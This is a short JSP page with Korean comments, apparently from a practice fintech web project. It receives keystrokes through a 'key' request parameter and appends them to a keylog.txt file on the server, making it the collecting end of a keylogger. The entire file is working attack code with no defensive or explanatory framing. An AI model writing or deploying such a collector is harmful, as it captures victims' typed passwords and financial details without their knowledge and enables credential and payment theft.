<%@ page import="java.io.*" %>
<%
    String key = request.getParameter("key");
    if (key != null) {
        try {
            // 지정된 경로에 파일 생성
            File file = new File("C:\\kdg\\tomcat\\webapps\\fintech_pj_damn\\keylogging\\keylog.txt");
            // 파일에 문자열 추가 모드로 작성
            OutputStreamWriter osw = new OutputStreamWriter(new FileOutputStream(file, true), "UTF-8");
            // 파일에 문자열 작성
            if (key.equals(" Enter ")) {
                osw.write("\n");
            } else {
                osw.write(key);
            }
            osw.close();
        } catch(IOException e) {
            e.printStackTrace();
        }
    }

%>